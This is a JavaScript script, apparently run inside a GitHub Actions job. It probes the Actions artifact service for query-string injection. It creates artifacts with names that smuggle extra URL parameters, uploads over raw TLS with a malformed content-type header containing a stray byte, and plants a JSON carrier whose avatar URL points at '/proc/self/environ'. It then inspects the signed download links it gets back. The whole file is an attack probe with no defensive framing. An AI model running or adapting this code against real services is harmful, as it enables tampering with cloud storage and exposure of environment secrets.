import {createHash} from 'node:crypto';
import tls from 'node:tls';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;
const runId = process.env.GITHUB_RUN_ID;
const sha = (b) => createHash('sha256').update(b).digest('hex');

function rawTls(urlStr, method, headerLines, body) {
  const u = new URL(urlStr);
  return new Promise((resolve, reject) => {
    const socket = tls.connect({host: u.hostname, port: Number(u.port || 443), servername: u.hostname, ALPNProtocols: ['http/1.1']});
    socket.setTimeout(30000);
    const chunks = [];
    socket.once('secureConnect', () => {
      const lines = [`${method} ${u.pathname}${u.search} HTTP/1.1`, `Host: ${u.host}`, ...headerLines, 'Connection: close', '', ''];
      socket.write(Buffer.concat([Buffer.from(lines.join('\r\n'), 'latin1'), body || Buffer.alloc(0)]));
    });
    socket.on('data', (c) => chunks.push(c));
    socket.once('error', reject);
    socket.once('timeout', () => socket.destroy(new Error('tls timeout')));
    socket.once('end', () => {
      const raw = Buffer.concat(chunks);
      const idx = raw.indexOf('\r\n\r\n');
      if (idx < 0) return resolve({status: null, raw, head: raw.toString('latin1'), body: Buffer.alloc(0), cts: []});
      const head = raw.subarray(0, idx).toString('latin1');
      const status = Number((head.split('\r\n')[0] || '').split(' ')[1]);
      let body = raw.subarray(idx + 4);
      const cts = [];
      for (const line of head.split('\r\n').slice(1)) {
        const p = line.indexOf(':');
        if (p < 0) continue;
        if (line.slice(0, p).toLowerCase() === 'content-type') cts.push(Buffer.from(line.slice(p + 1).trim(), 'latin1').toString('hex'));
      }
      resolve({status, raw, head, body, cts});
    });
  });
}

async function create(name, mime) {
  return client.CreateArtifact({...ids, name, version: 7, mimeType: StringValue.create({value: mime})});
}
async function finalize(name, bytes) {
  return client.FinalizeArtifact({...ids, name, size: String(bytes.length), hash: StringValue.create({value: `sha256:${sha(bytes)}`})});
}
async function restLocation(id) {
  const u = `https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`;
  const r = await fetch(u, {headers: {authorization: `Bearer ${token}`, accept: 'application/vnd.github.v3+json', 'user-agent': 'qinject'}, redirect: 'manual'});
  return {status: r.status, location: r.headers.get('location')};
}

const P = Buffer.from(JSON.stringify({
  full_name: `${repo}/actions/artifacts/0/zip`,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'qinject', stargazers_count: 0,
}));

const cases = [
  {label: 'control', suffix: '', mime: 'application/json'},
  {label: 'amp-api', suffix: '&api-version=2012-02-12', mime: 'application/json'},
  {label: 'amp-api-param', suffix: '&api-version=2012-02-12&x=1', mime: 'application/json'},
  {label: 'pct26-api', suffix: '%26api-version=2012-02-12', mime: 'application/json'},
  {label: 'amp-api-plain', suffix: '&api-version=2012-02-12', mime: 'text/plain'},
  {label: 'amp-api-json-name', suffix: '&api-version=2012-02-12.json', mime: 'application/json'},
];

const out = [];
for (const c of cases) {
  const rec = {label: c.label, mime: c.mime};
  const name = `qinj-${runId}-${c.label}${c.suffix}`;
  rec.name = name;
  try {
    const created = await create(name, c.mime);
    rec.createOk = Boolean(created.ok);
    if (!created.ok) { out.push(rec); continue; }
    // upload placeholder first via simple fetch with our raw PUT
    const placeholder = Buffer.from('{"q":1}');
    const put = await rawTls(created.signedUploadUrl, 'PUT', [
      'x-ms-blob-type: BlockBlob',
      'Content-Type: application/octet-stream',
      `Content-Length: ${placeholder.length}`,
    ], placeholder);
    rec.placeholderPut = put.status;
    // overwrite with carrier and stored content type containing raw 0x85
    const put2 = await rawTls(created.signedUploadUrl, 'PUT', [
      'x-ms-blob-type: BlockBlob',
      'x-ms-blob-content-type: application/json\x85',
      'Content-Type: application/octet-stream',
      `Content-Length: ${P.length}`,
    ], P);
    rec.put2 = put2.status;
    rec.put2Err = put2.status !== 201 ? put2.body.toString('utf8').slice(0, 200) : undefined;
    const fin = await finalize(name, P);
    rec.finOk = Boolean(fin.ok);
    rec.artifactId = String(fin.artifactId || '');
    if (!fin.ok) { out.push(rec); continue; }
    const loc = await restLocation(rec.artifactId);
    rec.restStatus = loc.status;
    rec.location = loc.location;
    if (loc.location) {
      const u = new URL(loc.location);
      rec.rsct = u.searchParams.get('rsct');
      rec.rscd = u.searchParams.get('rscd');
      rec.locationTail = loc.location.slice(-60);
      const asIs = await rawTls(loc.location, 'GET', ['User-Agent: qinject'], null);
      rec.asIsStatus = asIs.status;
      rec.asIsCtHex = asIs.cts;
      rec.asIsBodyMatch = asIs.body.equals(P);
      const old = await rawTls(loc.location + '&api-version=2012-02-12', 'GET', ['User-Agent: qinject'], null);
      rec.oldStatus = old.status;
      rec.oldCtHex = old.cts;
      rec.oldBodyMatch = old.body.equals(P);
    }
  } catch (e) {
    rec.err = String(e).slice(0, 300);
  }
  out.push(rec);
}
console.log('QINJECT', JSON.stringify(out));
